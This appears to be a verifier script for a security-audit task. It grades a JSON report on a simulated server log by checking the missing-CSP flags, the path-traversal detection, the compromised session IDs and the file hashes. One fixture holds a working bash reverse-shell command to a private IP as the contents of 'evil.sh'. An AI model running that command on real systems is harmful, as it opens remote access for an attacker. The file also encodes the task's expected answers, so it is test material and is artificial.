#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import json
import hashlib
import pytest

REPORT_PATH = "/home/user/audit_report.json"
LOG_PATH = "/home/user/audit_data/server.log"
UPLOADS_DIR = "/home/user/audit_data/uploads/"

EXPECTED_RECORDS = [
    {"req_id": "req_001", "endpoint": "/upload", "headers": {"Cookie": "session_id=abc1234"}, "resp_headers": {"Content-Security-Policy": "default-src 'self'", "X-Frame-Options": "DENY"}, "file_saved_path": "/home/user/audit_data/uploads/profile.jpg"},
    {"req_id": "req_002", "endpoint": "/upload", "headers": {"Cookie": "session_id=malicious99"}, "resp_headers": {"Content-Security-Policy": "default-src 'self'"}, "file_saved_path": "/home/user/audit_data/evil.sh"},
    {"req_id": "req_003", "endpoint": "/upload", "headers": {"Cookie": "session_id=test_sess_00"}, "resp_headers": {"X-Content-Type-Options": "nosniff"}, "file_saved_path": "/home/user/audit_data/uploads/doc.pdf"},
    {"req_id": "req_004", "endpoint": "/login", "headers": {"Cookie": "session_id=admin_sess"}, "resp_headers": {}, "file_saved_path": None},
]

EXPECTED_TRAVERSED_FILE_CONTENTS = {
    "/home/user/audit_data/evil.sh": b"bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
}

def get_expected_state():
    assert os.path.isfile(LOG_PATH), f"Log file missing: {LOG_PATH}"

    with open(LOG_PATH, "r") as f:
        records = [json.loads(line) for line in f if line.strip()]

    assert records == EXPECTED_RECORDS, "The audit log was modified from its original state"

    flagged_requests = []
    compromised_sessions = []
    traversed_files_hashes = {}

    for record in records:
        req_id = record.get("req_id")
        endpoint = record.get("endpoint")
        headers = record.get("headers", {})
        resp_headers = record.get("resp_headers", {})
        file_saved_path = record.get("file_saved_path")

        is_flagged = False
        is_traversal = False

        # 1. CSP Enforcement Check
        if endpoint == "/upload":
            csp = resp_headers.get("Content-Security-Policy")
            if csp != "default-src 'self'":
                is_flagged = True

        # 2. Path Traversal Identification
        if file_saved_path:
            abs_saved_path = os.path.abspath(file_saved_path)
            abs_uploads_dir = os.path.abspath(UPLOADS_DIR)

            if not abs_saved_path.startswith(abs_uploads_dir + os.sep):
                is_flagged = True
                is_traversal = True

        if is_flagged:
            flagged_requests.append(req_id)

            cookie = headers.get("Cookie", "")
            session_id = None
            for part in cookie.split(";"):
                part = part.strip()
                if part.startswith("session_id="):
                    session_id = part.split("=")[1]
                    break

            if session_id:
                compromised_sessions.append(session_id)

            # File Integrity Verification
            if is_traversal and file_saved_path:
                assert file_saved_path in EXPECTED_TRAVERSED_FILE_CONTENTS, \
                    f"Unexpected traversed file path: {file_saved_path}"
                assert os.path.isfile(file_saved_path), \
                    f"Traversed file missing: {file_saved_path}"
                with open(file_saved_path, "rb") as tf:
                    file_data = tf.read()
                assert file_data == EXPECTED_TRAVERSED_FILE_CONTENTS[file_saved_path], \
                    f"Traversed file was modified: {file_saved_path}"
                traversed_files_hashes[file_saved_path] = hashlib.sha256(file_data).hexdigest()

    return {
        "flagged_requests": sorted(flagged_requests),
        "compromised_sessions": sorted(compromised_sessions),
        "traversed_files_hashes": traversed_files_hashes,
    }

def test_audit_report_exists():
    assert os.path.isfile(REPORT_PATH), f"Audit report not found at {REPORT_PATH}"

def test_audit_report_content():
    assert os.path.isfile(REPORT_PATH), f"Audit report not found at {REPORT_PATH}"

    with open(REPORT_PATH, "r") as f:
        try:
            report = json.load(f)
        except json.JSONDecodeError:
            pytest.fail(f"Audit report at {REPORT_PATH} is not valid JSON")

    expected = get_expected_state()

    # 1. Check flagged requests
    actual_flagged = report.get("flagged_requests")
    assert actual_flagged is not None, "Missing 'flagged_requests' in report"
    assert isinstance(actual_flagged, list), "'flagged_requests' must be a list"
    assert sorted(actual_flagged) == expected["flagged_requests"], \
        f"Flagged requests mismatch. Expected {expected['flagged_requests']}, got {sorted(actual_flagged)}"

    # 2. Check compromised sessions
    actual_sessions = report.get("compromised_sessions")
    assert actual_sessions is not None, "Missing 'compromised_sessions' in report"
    assert isinstance(actual_sessions, list), "'compromised_sessions' must be a list"
    assert sorted(actual_sessions) == expected["compromised_sessions"], \
        f"Compromised sessions mismatch. Expected {expected['compromised_sessions']}, got {sorted(actual_sessions)}"

    # 3. Check traversed files hashes
    actual_hashes = report.get("traversed_files_hashes")
    assert actual_hashes is not None, "Missing 'traversed_files_hashes' in report"
    assert isinstance(actual_hashes, dict), "'traversed_files_hashes' must be an object/dict"
    assert actual_hashes == expected["traversed_files_hashes"], \
        f"Traversed files hashes mismatch. Expected {expected['traversed_files_hashes']}, got {actual_hashes}"
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
